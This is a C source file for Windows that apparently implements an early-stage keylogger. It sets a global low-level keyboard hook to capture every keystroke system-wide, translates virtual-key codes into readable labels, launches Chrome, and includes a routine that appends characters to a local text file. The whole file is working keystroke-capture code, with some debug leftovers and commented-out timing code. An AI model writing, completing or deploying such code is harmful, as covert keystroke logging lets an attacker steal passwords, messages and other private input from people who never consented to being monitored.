#include "keylogger.h"

HINSTANCE hinst;
static HHOOK handlekeyboard = NULL;

struct keyboard keyboard[] =
{
	{VK_BACK, "[bck]"},
	{VK_TAB, "[tab]"},
	{VK_CLEAR, "[CLR]"},
	{VK_RETURN, "[enter]"},
	{VK_SHIFT, "[shift]"},
	{VK_CONTROL, "[ctrl]"},
	{VK_MENU, "[alt]"},
	{VK_CAPITAL, "[Caps Lock]"},
	{VK_ESCAPE, "[esc]"},
	{VK_SPACE, "[SPACE]"},
	{VK_PRIOR, "[PGUP]"},
	{VK_NEXT, "[PGDW]"},
	{VK_END, "[END]"},
	{VK_LEFT, "[LEFT]"},
	{VK_UP, "[UP]"},
	{VK_RIGHT, "[RIGHT]"},
	{VK_DOWN, "[DOWN]"},
	{VK_SNAPSHOT, "[PRTSCRN]"},
	{VK_INSERT, "[insert]"},
	{VK_DELETE, "[DEL]"},
	{0x30, "0"},
	{0x31, "1"},
	{0x32, "2"},
	{0x33, "3"},
	{0x34, "4"},
	{0x35, "5"},
	{0x36, "6"},
	{0x37, "7"},
	{0x38, "8"},
	{0x39, "9"},
	{VK_NUMPAD0, "0" },
	{VK_NUMPAD1, "1" },
	{VK_NUMPAD2, "2" },
	{VK_NUMPAD3, "3" },
	{VK_NUMPAD4, "4" },
	{VK_NUMPAD5, "5" },
	{VK_NUMPAD6, "6" },
	{VK_NUMPAD7, "7" },
	{VK_NUMPAD8, "8" },
	{VK_NUMPAD9, "9" },
	{0, NULL}
};

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	LPKBDLLHOOKSTRUCT kb;
	kb = (LPKBDLLHOOKSTRUCT)lparam;
	printf("%u\n", kb->vkCode);
	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}
	
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{	
	LPKBDLLHOOKSTRUCT kb;
	size_t			  i = 0;
	kb = (LPKBDLLHOOKSTRUCT)lparam;
	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
		printf("%c\n", (char)kb->vkCode);
#if 1
	else
	{
		for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
		printf("%s ", keyboard[i].character);
	}
#endif // 0

	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
}

void	setwinhook()
{
	STARTUPINFO startup;
	PROCESS_INFORMATION process;
	
	SecureZeroMemory(&startup, sizeof(startup));
	SecureZeroMemory(&process, sizeof(process));
	startup.cb = sizeof(startup);
	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &process) == 0)
		return;
	//hinst = GetModuleHandle(L"chrome.exe");
	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
		return;
	CloseHandle(process.hProcess);
	CloseHandle(process.hThread);
}

void	save_data(char data)
{
	static int nbChar;

	/* test time

	static time_t timet1;
	static double countTime;

	time_t timet2;
	Sleep(3000);
	time(&timet2); 

	double elapseTime;

	elapseTime = difftime(timet2, timet1);

	printf( "Time : %f\n", countTime);

	*/

	FILE *file;
	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
		_wperror(L" Open file failed ");

	_write(_fileno(file), &data, 1);

	if (nbChar == 61)
	{
		if (vfprintf_s(file, "\n", NULL) < 0)
			_wperror(L" Add \\n at the end of the file failed ");
		nbChar = 0;
	}

	if (fclose(file) != 0)
		_wperror(L" Close file failed ");

	/* countTime = countTime + elapseTime; 
	if (countTime > 60)
		timet1 = 0; */

	nbChar++;

}

int	main(void)
{
	MSG msg;

	for (int i = 0; i < 121; i++)
	{
		save_data('c');
	}

	setwinhook();				
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(handlekeyboard);
	return (msg.wParam);


}